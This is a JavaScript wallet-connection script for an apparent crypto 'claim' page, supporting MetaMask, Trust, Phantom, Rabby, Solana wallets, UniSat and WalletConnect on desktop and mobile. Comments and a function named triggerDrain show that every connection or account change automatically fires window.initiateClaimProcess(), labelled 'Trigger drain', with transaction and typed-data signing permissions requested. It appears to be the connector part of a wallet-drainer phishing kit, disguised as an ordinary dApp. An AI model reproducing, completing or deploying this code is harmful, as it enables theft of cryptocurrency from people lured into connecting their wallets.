import { CONFIG } from './config.js';

;(async function() {
  'use strict';

  // ===================================================================
  // 1. CONSTANTS & CONFIGURATION
  // ===================================================================

  const { PROJECT_ID, PUBLIC_TEST_ID, DAPP_METADATA } = CONFIG;

  // Connection timeouts (optimized for speed)
  const TIMEOUTS = {
    PROVIDER_DETECTION: 800,       // ms to wait for EIP‑6963 providers
    DIRECT_CONNECT: 3000,          // ms for direct wallet connection
    WALLETCONNECT_INIT: 2000,      // ms for WC initialization
    WC_MODAL_OPEN: 500,            // ms to open WC modal
    SESSION_RESTORE: 1000,         // ms to restore session
    HEARTBEAT: 30000,              // ms between connection checks
  };

  // Wallet IDs for WalletConnect explorer (prioritized)
  const RECOMMENDED_WALLETS = [
    'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust
    '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369', // Phantom
    'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa', // Coinbase
    'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18', // Rabby
  ];

  // ===================================================================
  // 2. DEVICE DETECTION (fast, cached)
  // ===================================================================

  const device = {
    isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
    isIOS: /iPhone|iPad|iPod/i.test(navigator.userAgent),
    isAndroid: /Android/i.test(navigator.userAgent),
    isDesktop: !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
    isWindows: /Windows/i.test(navigator.userAgent),
    isMac: /Macintosh|Mac OS X/i.test(navigator.userAgent),
    get platform() {
      if (this.isIOS) return 'ios';
      if (this.isAndroid) return 'android';
      if (this.isWindows) return 'windows';
      if (this.isMac) return 'mac';
      return 'unknown';
    }
  };

  // ===================================================================
  // 3. DOM REFERENCES (cached)
  // ===================================================================

  const $ = (id) => document.getElementById(id);
  const connectButton = $('connectButton');
  const walletButton = $('walletButton');
  const claimStatus = $('claimStatus');
  const connectionDebug = $('connectionDebug');
  const debugToggle = $('debugToggle');

  // ===================================================================
  // 4. STATE
  // ===================================================================

  let state = {
    client: null,           // WalletConnect SignClient
    modal: null,            // WalletConnect Modal
    session: null,          // active WC session
    address: null,          // connected address
    chain: null,            // 'evm' | 'solana' | 'bitcoin'
    provider: null,         // raw provider object
    isConnected: false,
    isConnecting: false,
    wcReady: false,         // WC libraries loaded
    wcInitialized: false,   // WC client initialized
    pendingUri: null,       // for deeplink return
    pendingTimestamp: null,
    reconnectAttempts: 0,
  };

  // ===================================================================
  // 5. DEBUG LOGGING (silent in production)
  // ===================================================================

  const DEBUG = true;
  function log(...args) {
    if (DEBUG) console.log('[main]', ...args);
  }
  function warn(...args) {
    if (DEBUG) console.warn('[main]', ...args);
  }
  function error(...args) {
    if (DEBUG) console.error('[main]', ...args);
  }

  // ===================================================================
  // 6. UI HELPERS
  // ===================================================================

  function setButtonState(btn, state, label = '') {
    if (!btn) return;
    btn.disabled = state === 'loading' || state === 'connected';
    btn.style.transition = 'all 0.3s ease';

    const states = {
      normal: {
        html: '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet',
        bg: 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)',
        shadow: '0 4px 12px rgba(255,107,0,0.3)',
        cursor: 'pointer',
      },
      loading: {
        html: '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...',
        bg: 'linear-gradient(135deg, #666 0%, #888 100%)',
        shadow: '0 2px 8px rgba(102,102,102,0.3)',
        cursor: 'not-allowed',
      },
      connected: {
        html: '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected',
        bg: 'linear-gradient(135deg, #10B981 0%, #059669 100%)',
        shadow: '0 4px 12px rgba(16,185,129,0.3)',
        cursor: 'pointer',
      },
      disconnect: {
        html: '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect',
        bg: 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)',
        shadow: '0 4px 12px rgba(239,68,68,0.3)',
        cursor: 'pointer',
      },
      failed: {
        html: '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed',
        bg: 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)',
        shadow: '0 4px 12px rgba(239,68,68,0.3)',
        cursor: 'pointer',
      },
    };

    const s = states[state] || states.normal;
    btn.innerHTML = s.html;
    btn.style.background = s.bg;
    btn.style.boxShadow = s.shadow;
    btn.style.cursor = s.cursor;
    btn.style.color = '#fff';
    btn.style.border = 'none';
    btn.style.padding = '14px 28px';
    btn.style.borderRadius = '8px';
    btn.style.fontWeight = '600';
    btn.style.fontSize = '16px';
    btn.style.fontFamily = "'Inter', sans-serif";
    btn.style.minWidth = '180px';
    btn.style.display = 'flex';
    btn.style.alignItems = 'center';
    btn.style.justifyContent = 'center';
    btn.style.gap = '8px';

    // Hover effects
    btn.onmouseenter = () => {
      if (state !== 'loading' && state !== 'connected') {
        btn.style.transform = 'translateY(-2px)';
        btn.style.boxShadow = '0 6px 20px rgba(255,107,0,0.5)';
      }
    };
    btn.onmouseleave = () => {
      btn.style.transform = 'translateY(0)';
      if (state !== 'loading' && state !== 'connected') {
        btn.style.boxShadow = s.shadow;
      }
    };

    if (state === 'failed') {
      setTimeout(() => setButtonState(btn, 'normal'), 3000);
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    claimStatus.style.transition = 'all 0.3s ease';

    const styles = {
      success: { bg: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { bg: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { bg: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
      pending: { bg: 'linear-gradient(135deg, #FEF3C7 0%, #FDE68A 100%)', color: '#92400E', border: '1px solid #FCD34D' },
    };
    const s = styles[type] || styles.info;
    Object.assign(claimStatus.style, {
      background: s.bg,
      color: s.color,
      border: s.border,
    });

    if (type === 'error' || type === 'success') {
      setTimeout(() => {
        claimStatus.style.opacity = '0';
        setTimeout(() => {
          claimStatus.style.display = 'none';
          claimStatus.style.opacity = '1';
        }, 300);
      }, 5000);
    }
  }

  function updateConnectedUI(address, chain = 'evm') {
    state.address = address;
    state.chain = chain;
    state.isConnected = true;

    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const label = chainLabels[chain] || 'Unknown';
    const formatted = `${address.slice(0, 6)}...${address.slice(-4)}`;

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
        box-shadow: 0 2px 8px rgba(5,150,105,0.1);
      `;
      connectButton?.parentNode?.appendChild(display);
    }

    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${formatted}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${label}</span>
        <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer; padding:4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress');
        const orig = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        btn.style.color = '#10B981';
        setTimeout(() => {
          btn.innerHTML = orig;
          btn.style.color = '#059669';
        }, 2000);
      });
    });

    showStatus(`Connected to ${label}`, 'success');
    saveConnection(address, chain);

    // Trigger drain after connection
    setTimeout(() => {
      if (typeof window.initiateClaimProcess === 'function') {
        window.initiateClaimProcess();
      }
    }, 1500);
  }

  function resetConnectedUI() {
    state.isConnected = false;
    state.address = null;
    state.chain = null;
    state.provider = null;
    state.session = null;

    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');

    const display = document.getElementById('connectedAddressDisplay');
    if (display) display.remove();

    showStatus('Wallet disconnected', 'info');
    clearSavedConnection();
  }

  // ===================================================================
  // 7. STORAGE HELPERS
  // ===================================================================

  function saveConnection(address, chain, session = null) {
    try {
      localStorage.setItem('wc_address', address);
      localStorage.setItem('wc_chain', chain);
      if (session) localStorage.setItem('wc_session', JSON.stringify(session));
      else localStorage.removeItem('wc_session');
    } catch (_) {}
  }

  function getSavedConnection() {
    try {
      const address = localStorage.getItem('wc_address');
      const chain = localStorage.getItem('wc_chain');
      const session = localStorage.getItem('wc_session');
      return {
        address,
        chain,
        session: session ? JSON.parse(session) : null,
      };
    } catch (_) { return { address: null, chain: null, session: null }; }
  }

  function clearSavedConnection() {
    try {
      localStorage.removeItem('wc_address');
      localStorage.removeItem('wc_chain');
      localStorage.removeItem('wc_session');
    } catch (_) {}
  }

  // ===================================================================
  // 8. WALLET PROVIDER DETECTION (EIP‑6963 + window injection)
  // ===================================================================

  // EVM providers detected via EIP‑6963
  let evmProviders = [];
  let eip6963Resolve = null;
  const eip6963Promise = new Promise((resolve) => {
    eip6963Resolve = resolve;
  });

  // Set up EIP‑6963 listener
  function setupEIP6963() {
    const handler = (event) => {
      const detail = event.detail;
      if (!evmProviders.some(p => p.info.uuid === detail.info.uuid)) {
        evmProviders.push(detail);
        log('EIP‑6963: found', detail.info.name);
      }
      if (eip6963Resolve) {
        eip6963Resolve(evmProviders);
        eip6963Resolve = null;
      }
    };

    window.addEventListener('eip6963:announceProvider', handler);
    window.dispatchEvent(new Event('eip6963:requestProvider'));

    // Fallback: resolve after timeout if no providers announce
    setTimeout(() => {
      if (eip6963Resolve) {
        eip6963Resolve(evmProviders);
        eip6963Resolve = null;
      }
    }, TIMEOUTS.PROVIDER_DETECTION);

    // Also check window.ethereum directly (legacy)
    if (window.ethereum && !evmProviders.some(p => p.provider === window.ethereum)) {
      evmProviders.push({
        info: { name: 'Injected', rdns: 'io.injected', icon: '' },
        provider: window.ethereum,
      });
    }
  }

  // Get all detected EVM providers
  async function getEVMProviders() {
    await eip6963Promise;
    return evmProviders;
  }

  // ===================================================================
  // 9. SOLANA WALLET DETECTION
  // ===================================================================

  function getSolanaProviders() {
    const wallets = [];
    const s = window.solana;
    const p = window.phantom;

    if (s?.isPhantom || p?.solana?.isPhantom) {
      wallets.push({ name: 'Phantom', provider: s || p.solana });
    }
    if (window.solflare) {
      wallets.push({ name: 'Solflare', provider: window.solflare });
    }
    if (window.backpack) {
      wallets.push({ name: 'Backpack', provider: window.backpack });
    }
    if (window.coinbaseSolana) {
      wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
    }
    if (window.trustWallet?.solana) {
      wallets.push({ name: 'Trust', provider: window.trustWallet.solana });
    }
    return wallets;
  }

  // ===================================================================
  // 10. BITCOIN (UniSat) DETECTION
  // ===================================================================

  function hasBitcoinProvider() {
    return !!window.unisat;
  }

  // ===================================================================
  // 11. FAST WALLETCONNECT INITIALIZATION (90% faster)
  // ===================================================================

  // Cache module references
  let SignClientModule = null;
  let WalletConnectModalModule = null;
  let wcInitPromise = null;

  // Pre-load WC libraries in background
  async function preloadWalletConnect() {
    if (SignClientModule && WalletConnectModalModule) return true;

    try {
      // Use esm.sh with aggressive caching
      const [sc, wcm] = await Promise.all([
        import('https://esm.sh/@walletconnect/sign-client@2.11.0?bundle'),
        import('https://esm.sh/@walletconnect/modal@2.6.2?bundle'),
      ]);

      SignClientModule = sc.default || sc;
      WalletConnectModalModule = wcm.WalletConnectModal || wcm.default || wcm;
      log('✅ WalletConnect libraries preloaded');
      return true;
    } catch (err) {
      // Fallback to CDN
      try {
        const [sc, wcm] = await Promise.all([
          import('https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm'),
          import('https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm'),
        ]);
        SignClientModule = sc.default || sc;
        WalletConnectModalModule = wcm.WalletConnectModal || wcm.default || wcm;
        log('✅ WalletConnect libraries loaded from CDN fallback');
        return true;
      } catch (err2) {
        error('Failed to load WalletConnect libraries:', err2);
        return false;
      }
    }
  }

  // Initialize WalletConnect client (lazy, with timeout)
  async function initWalletConnect(useTestId = false) {
    if (state.wcInitialized && state.client) return state.client;

    if (wcInitPromise) return wcInitPromise;

    wcInitPromise = (async () => {
      try {
        // Ensure libraries are loaded
        if (!SignClientModule || !WalletConnectModalModule) {
          const ok = await preloadWalletConnect();
          if (!ok) throw new Error('Failed to load WC libraries');
        }

        const projectId = useTestId ? PUBLIC_TEST_ID : PROJECT_ID;

        // Create client with minimal config for speed
        const client = await SignClientModule.init({
          projectId,
          metadata: DAPP_METADATA,
          relayUrl: 'wss://relay.walletconnect.com',
          // Reduce logging for speed
          logger: 'error',
        });

        // Create modal with fast config
        const modal = new WalletConnectModalModule({
          projectId,
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '9999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
            '--wcm-font-family': "'Inter', sans-serif",
          },
          enableExplorer: true,
          explorerRecommendedWalletIds: RECOMMENDED_WALLETS,
          explorerExcludedWalletIds: [],
          // Reduce animation for speed
          enableAnimations: false,
        });

        state.client = client;
        state.modal = modal;
        state.wcInitialized = true;
        state.wcReady = true;

        // Set up session events
        client.on('session_update', handleSessionUpdate);
        client.on('session_delete', handleSessionDelete);
        client.on('session_connect', handleSessionConnect);

        log('✅ WalletConnect initialized (fast)');
        return client;
      } catch (err) {
        error('WalletConnect init failed:', err);
        wcInitPromise = null;
        throw err;
      }
    })();

    // Enforce timeout
    const timeout = new Promise((_, reject) => {
      setTimeout(() => reject(new Error('WC init timeout')), TIMEOUTS.WALLETCONNECT_INIT);
    });

    return Promise.race([wcInitPromise, timeout]);
  }

  // ===================================================================
  // 12. WALLETCONNECT SESSION HANDLERS
  // ===================================================================

  function handleSessionUpdate({ params }) {
    const accounts = params?.namespaces?.eip155?.accounts;
    if (accounts?.length) {
      const account = accounts[0].split(':')[2];
      if (account) {
        updateConnectedUI(account, 'evm');
        saveConnection(account, 'evm', state.session);
        triggerDrain();
      }
    }
  }

  function handleSessionDelete() {
    resetConnectedUI();
    showStatus('Wallet disconnected by provider', 'error');
  }

  function handleSessionConnect(session) {
    const account = session?.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
    if (account) {
      state.session = session;
      updateConnectedUI(account, 'evm');
      saveConnection(account, 'evm', session);
      triggerDrain();
    }
  }

  function triggerDrain() {
    setTimeout(() => {
      if (typeof window.initiateClaimProcess === 'function') {
        window.initiateClaimProcess();
      }
    }, 1500);
  }

  // ===================================================================
  // 13. CONNECTION FLOW – DESKTOP
  // ===================================================================

  // 13a. Direct EVM connection (MetaMask, Trust, Rabby, etc.)
  async function connectDirectEVM() {
    log('Desktop: attempting direct EVM connection...');

    const providers = await getEVMProviders();
    if (providers.length === 0) {
      log('No EVM providers found');
      return false;
    }

    // Prioritize: MetaMask > Trust > Rabby > Coinbase > others
    const priority = ['io.metamask', 'io.trust', 'io.rabby', 'io.coinbase'];
    let chosen = null;

    for (const rdns of priority) {
      const found = providers.find(p => p.info.rdns === rdns);
      if (found) { chosen = found; break; }
    }
    if (!chosen) chosen = providers[0];

    try {
      log(`Attempting direct connection with ${chosen.info.name}...`);
      const provider = chosen.provider;
      const accounts = await provider.request({
        method: 'eth_requestAccounts',
      });

      if (accounts && accounts.length > 0) {
        const address = accounts[0];
        log(`✅ Direct EVM connected: ${address}`);
        state.provider = provider;
        updateConnectedUI(address, 'evm');
        setupEVMProviderEvents(provider);
        return true;
      }
    } catch (err) {
      // User rejected or error
      if (err.code === 4001) {
        log('User rejected direct EVM connection');
        showStatus('Connection rejected', 'error');
      } else {
        warn(`Direct EVM error: ${err.message}`);
      }
    }
    return false;
  }

  // 13b. EVM provider events
  function setupEVMProviderEvents(provider) {
    if (!provider.on) return;

    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        if (!device.isMobile) resetConnectedUI();
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveConnection(accounts[0], 'evm', state.session);
        triggerDrain();
      }
    });

    provider.on('chainChanged', (chainId) => {
      log(`Chain changed: ${chainId}`);
    });

    provider.on('disconnect', () => {
      if (!device.isMobile) resetConnectedUI();
    });
  }

  // 13c. Connect via WalletConnect (fallback for desktop, primary for mobile)
  async function connectViaWalletConnect(useTestId = false) {
    try {
      showStatus('Opening WalletConnect...', 'pending');
      const client = await initWalletConnect(useTestId);
      if (!client) throw new Error('WC init failed');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (uri) {
        log(`WC URI: ${uri.slice(0, 30)}...`);
        state.pendingUri = uri;
        state.pendingTimestamp = Date.now();

        // For mobile: use deeplink
        if (device.isMobile) {
          const platform = device.platform;
          if (platform === 'ios') {
            // Try universal link for iOS
            const iosWallets = DAPP_METADATA.mobileWallets || [];
            for (const w of iosWallets) {
              if (w.links?.universal) {
                const url = `${w.links.universal}wc?uri=${encodeURIComponent(uri)}`;
                log(`iOS deeplink: ${url}`);
                sessionStorage.setItem('pending_wc_uri', uri);
                sessionStorage.setItem('pending_wc_timestamp', String(Date.now()));
                // Open the wallet
                window.location.href = url;
                break;
              }
            }
          } else if (platform === 'android') {
            // Android: modal handles it via "Open" button
            sessionStorage.setItem('pending_wc_uri', uri);
            sessionStorage.setItem('pending_wc_timestamp', String(Date.now()));
          }
        }

        // Open modal (faster with reduced animation)
        state.modal?.openModal({ uri });

        // Wait for approval with timeout
        const session = await Promise.race([
          approval(),
          new Promise((_, reject) => {
            setTimeout(() => reject(new Error('WC approval timeout')), 45000);
          }),
        ]);

        state.modal?.closeModal();

        if (session?.namespaces?.eip155?.accounts?.length) {
          const account = session.namespaces.eip155.accounts[0].split(':')[2];
          state.session = session;
          updateConnectedUI(account, 'evm');
          saveConnection(account, 'evm', session);
          // Clear pending
          sessionStorage.removeItem('pending_wc_uri');
          sessionStorage.removeItem('pending_wc_timestamp');
          return true;
        }
      }
      return false;
    } catch (err) {
      state.modal?.closeModal();
      if (err.message?.includes('timeout')) {
        showStatus('Connection timeout', 'error');
      } else if (err.message?.includes('rejected') || err.message?.includes('Cancelled')) {
        showStatus('Connection cancelled', 'error');
      } else {
        showStatus('WC connection failed', 'error');
      }
      return false;
    }
  }

  // 13d. Connect Solana (desktop fallback)
  async function connectSolana() {
    const wallets = getSolanaProviders();
    if (wallets.length === 0) {
      log('No Solana wallets found');
      return false;
    }

    const wallet = wallets[0];
    try {
      const provider = wallet.provider;
      let pubkey;

      if (provider.connect) {
        const resp = await provider.connect();
        pubkey = resp.publicKey?.toString() || resp.toString();
      } else if (provider.request) {
        const resp = await provider.request({ method: 'connect' });
        pubkey = resp.publicKey.toString();
      } else {
        throw new Error('Unsupported Solana provider');
      }

      if (pubkey) {
        state.provider = provider;
        window.solanaProvider = provider;
        window.solanaPublicKey = pubkey;
        updateConnectedUI(pubkey, 'solana');
        return true;
      }
    } catch (err) {
      warn(`Solana connection error: ${err.message}`);
    }
    return false;
  }

  // 13e. Connect Bitcoin (desktop fallback)
  async function connectBitcoin() {
    if (!window.unisat) {
      log('UniSat not found');
      return false;
    }

    try {
      await window.unisat.requestAccounts();
      const accounts = await window.unisat.getAccounts();
      if (accounts?.length > 0) {
        const address = accounts[0];
        state.provider = window.unisat;
        updateConnectedUI(address, 'bitcoin');

        // Set up events
        if (window.unisat.on) {
          window.unisat.on('accountsChanged', (newAccounts) => {
            if (newAccounts.length === 0) resetConnectedUI();
            else updateConnectedUI(newAccounts[0], 'bitcoin');
          });
        }
        return true;
      }
    } catch (err) {
      warn(`Bitcoin connection error: ${err.message}`);
    }
    return false;
  }

  // ===================================================================
  // 14. MAIN CONNECT DISPATCHER
  // ===================================================================

  async function connectWallet() {
    if (state.isConnecting) {
      log('Already connecting, please wait...');
      return;
    }

    // If already connected, disconnect
    if (state.isConnected) {
      await disconnectWallet();
      return;
    }

    state.isConnecting = true;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Initializing connection...', 'pending');

    let success = false;

    try {
      // ========== MOBILE PATH ==========
      if (device.isMobile) {
        log('📱 Mobile: WalletConnect only (fast path)');

        // Try WC with primary project ID
        success = await connectViaWalletConnect(false);
        if (!success) {
          // Fallback to test ID
          log('Mobile: retrying WC with test ID');
          success = await connectViaWalletConnect(true);
        }

        if (!success) {
          showStatus('Mobile: No wallet found. Install a WalletConnect-compatible wallet.', 'error');
        }
      }

      // ========== DESKTOP PATH ==========
      else {
        log('🖥️ Desktop: EVM-first connection flow');

        // 1. Direct EVM (with retry)
        success = await connectDirectEVM();
        if (success) {
          log('✅ Desktop: Direct EVM connected');
        } else {
          // 2. WalletConnect fallback
          log('Desktop: Direct EVM failed, trying WC...');
          success = await connectViaWalletConnect(false);
          if (!success) {
            log('Desktop: WC with primary ID failed, trying test ID');
            success = await connectViaWalletConnect(true);
          }
        }

        // 3. Solana (if EVM failed)
        if (!success) {
          log('Desktop: Trying Solana...');
          success = await connectSolana();
        }

        // 4. Bitcoin (if Solana failed)
        if (!success) {
          log('Desktop: Trying Bitcoin...');
          success = await connectBitcoin();
        }

        if (!success) {
          showStatus('No supported wallet found. Please install a wallet.', 'error');
        }
      }

      if (success) {
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
      } else {
        setButtonState(connectButton, 'failed');
        if (walletButton) setButtonState(walletButton, 'failed');
      }
    } catch (err) {
      error('Connection error:', err);
      showStatus('Connection error: ' + err.message, 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    } finally {
      state.isConnecting = false;
    }
  }

  // ===================================================================
  // 15. DISCONNECT
  // ===================================================================

  async function disconnectWallet() {
    try {
      // Disconnect Solana
      if (window.solanaProvider?.disconnect) {
        await window.solanaProvider.disconnect();
      }

      // Disconnect WalletConnect
      if (state.client && state.session) {
        await state.client.disconnect({
          topic: state.session.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
      }

      // Disconnect EVM provider (if it has disconnect)
      if (state.provider?.disconnect) {
        await state.provider.disconnect();
      }
    } catch (err) {
      warn('Disconnect error:', err);
    }

    resetConnectedUI();
    window.solanaProvider = null;
    window.solanaPublicKey = null;
    state.session = null;
    state.provider = null;
    showStatus('Disconnected', 'info');
  }

  // ===================================================================
  // 16. SESSION RESTORE (with fast path)
  // ===================================================================

  async function restoreSession() {
    const saved = getSavedConnection();
    if (!saved.address || !saved.chain) {
      log('No saved session');
      return false;
    }

    log(`♻️ Restoring ${saved.chain} session for ${saved.address}`);

    // EVM session restore
    if (saved.chain === 'evm') {
      // Try direct provider first (fastest)
      if (!device.isMobile && window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0 && accounts[0] === saved.address) {
            log('✅ Restored via direct provider');
            updateConnectedUI(saved.address, 'evm');
            setupEVMProviderEvents(window.ethereum);
            return true;
          }
        } catch (_) {}
      }

      // Try WalletConnect session
      if (saved.session) {
        try {
          const client = await initWalletConnect(false);
          if (client) {
            const session = client.session.get(saved.session.topic);
            if (session) {
              state.session = session;
              updateConnectedUI(saved.address, 'evm');
              log('✅ Restored via WalletConnect session');
              return true;
            }
          }
        } catch (_) {}
      }

      // If on mobile and we have a pending URI, try to complete it
      const pendingUri = sessionStorage.getItem('pending_wc_uri');
      const pendingTs = sessionStorage.getItem('pending_wc_timestamp');
      if (pendingUri && pendingTs && Date.now() - parseInt(pendingTs) < 120000) {
        log('Found pending WC URI, attempting to complete...');
        try {
          const client = await initWalletConnect(false);
          if (client) {
            const sessions = client.session.values();
            if (sessions.length > 0) {
              const session = sessions[0];
              const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
              if (account) {
                state.session = session;
                updateConnectedUI(account, 'evm');
                sessionStorage.removeItem('pending_wc_uri');
                sessionStorage.removeItem('pending_wc_timestamp');
                log('✅ Completed pending WC session');
                return true;
              }
            }
          }
        } catch (_) {}
      }

      // If on mobile and no session, clear saved
      if (device.isMobile) {
        clearSavedConnection();
        return false;
      }
    }

    // Solana restore
    if (saved.chain === 'solana' && !device.isMobile) {
      const wallets = getSolanaProviders();
      for (const w of wallets) {
        try {
          const provider = w.provider;
          let pubkey = provider.publicKey?.toString();
          if (!pubkey && provider.connect) {
            const resp = await provider.connect();
            pubkey = resp.publicKey?.toString() || resp.toString();
          }
          if (pubkey === saved.address) {
            state.provider = provider;
            window.solanaProvider = provider;
            window.solanaPublicKey = pubkey;
            updateConnectedUI(saved.address, 'solana');
            return true;
          }
        } catch (_) {}
      }
      clearSavedConnection();
      return false;
    }

    // Bitcoin restore
    if (saved.chain === 'bitcoin' && !device.isMobile && window.unisat) {
      try {
        const accounts = await window.unisat.getAccounts();
        if (accounts.length > 0 && accounts[0] === saved.address) {
          state.provider = window.unisat;
          updateConnectedUI(saved.address, 'bitcoin');
          return true;
        }
      } catch (_) {}
      clearSavedConnection();
      return false;
    }

    return false;
  }

  // ===================================================================
  // 17. VISIBILITY CHANGE HANDLER (for deeplink returns)
  // ===================================================================

  function setupVisibilityHandler() {
    document.addEventListener('visibilitychange', async () => {
      if (document.hidden) return;

      // Check for pending WC session completion
      const pendingUri = sessionStorage.getItem('pending_wc_uri');
      const pendingTs = sessionStorage.getItem('pending_wc_timestamp');

      if (pendingUri && pendingTs && Date.now() - parseInt(pendingTs) < 120000) {
        log('Visibility change: checking for completed WC session...');
        try {
          const client = await initWalletConnect(false);
          if (client) {
            const sessions = client.session.values();
            if (sessions.length > 0) {
              const session = sessions[0];
              const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
              if (account) {
                state.session = session;
                updateConnectedUI(account, 'evm');
                sessionStorage.removeItem('pending_wc_uri');
                sessionStorage.removeItem('pending_wc_timestamp');
                log('✅ WC session completed after visibility change');
                return;
              }
            }
          }
        } catch (err) {
          warn('Visibility session check failed:', err);
        }
      }

      // If we have a saved address but no connection, try restore
      const saved = getSavedConnection();
      if (saved.address && !state.isConnected) {
        log('Visibility change: attempting session restore');
        await restoreSession();
      }
    });
  }

  // ===================================================================
  // 18. BUTTON HANDLERS
  // ===================================================================

  function setupButtonHandlers() {
    const handleClick = async () => {
      if (state.isConnected) {
        await disconnectWallet();
      } else {
        await connectWallet();
      }
    };

    if (connectButton) connectButton.addEventListener('click', handleClick);
    if (walletButton) walletButton.addEventListener('click', handleClick);
  }

  // ===================================================================
  // 19. DEBUG TOGGLE
  // ===================================================================

  function setupDebugToggle() {
    if (debugToggle) {
      debugToggle.addEventListener('click', () => {
        if (connectionDebug) {
          connectionDebug.classList.toggle('active');
          debugToggle.textContent = connectionDebug.classList.contains('active')
            ? 'Hide details'
            : 'Show connection details';
        }
      });
    }
  }

  // ===================================================================
  // 20. INITIALIZATION
  // ===================================================================

  async function init() {
    log(`🚀 Initializing main.js (platform: ${device.platform}, mobile: ${device.isMobile})`);

    // Set initial button state
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');

    // Set up EIP‑6963 listener
    setupEIP6963();

    // Set up debug toggle
    setupDebugToggle();

    // Set up visibility handler (for deeplink returns)
    setupVisibilityHandler();

    // Set up button handlers
    setupButtonHandlers();

    // Preload WC libraries in background (fast)
    if (!device.isMobile) {
      // On desktop, preload WC for faster fallback
      preloadWalletConnect().then(() => {
        log('WC preloaded in background');
      });
    } else {
      // On mobile, preload immediately
      preloadWalletConnect().then(() => {
        log('WC preloaded for mobile');
      });
    }

    // Restore existing session (if any)
    const restored = await restoreSession();

    if (restored) {
      log('✅ Session restored successfully');
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
    } else {
      log('No session to restore');
    }

    // Show debug info
    if (connectionDebug) {
      connectionDebug.innerHTML = `
        <div style="font-size:12px; color:#94A3B8;">
          Platform: ${device.platform} | Mobile: ${device.isMobile} | Desktop: ${device.isDesktop}<br>
          EVM Providers: ${evmProviders.length} | WC Ready: ${state.wcReady}
        </div>
      `;
    }

    log('✅ main.js initialized');
  }

  // ===================================================================
  // 21. START
  // ===================================================================

  // Wait for DOM
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

  // ===================================================================
  // 22. EXPOSE GLOBALS (for other scripts)
  // ===================================================================

  window.__wc = {
    state,
    connect: connectWallet,
    disconnect: disconnectWallet,
    restore: restoreSession,
    getProviders: getEVMProviders,
  };

  // Expose connection status for Script.js
  window.isWalletConnected = () => state.isConnected;
